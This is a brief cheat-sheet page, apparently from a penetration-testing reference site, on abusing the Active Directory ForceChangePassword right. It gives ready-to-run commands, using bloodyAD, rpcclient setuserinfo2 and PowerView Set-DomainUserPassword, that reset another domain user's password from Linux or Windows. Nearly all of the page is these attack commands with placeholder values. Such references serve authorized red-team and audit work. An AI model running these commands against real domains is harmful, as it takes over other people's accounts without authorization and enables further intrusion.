---
title: "ForceChangePassword"
date: 2024-7-18
tags: ["Forcechangepassword", "Powerview", "Active Directory", "Windows", "bloodyAD"]
---

### Change target user password (From Linux)

{{< tab set1 tab1 active >}}BloodyAD{{< /tab >}}
{{< tab set1 tab2 >}}rpcclient{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password <TARGET_USER> '<NEW_PASSWORD>'
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <TARGET_USER_NEW_PASSWORD>'
```

{{< /tabcontent >}}

### Change target user password (From Windows)

{{< tab set2 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Change Target User Password

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force 
```

```console
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

{{< /tabcontent >}}
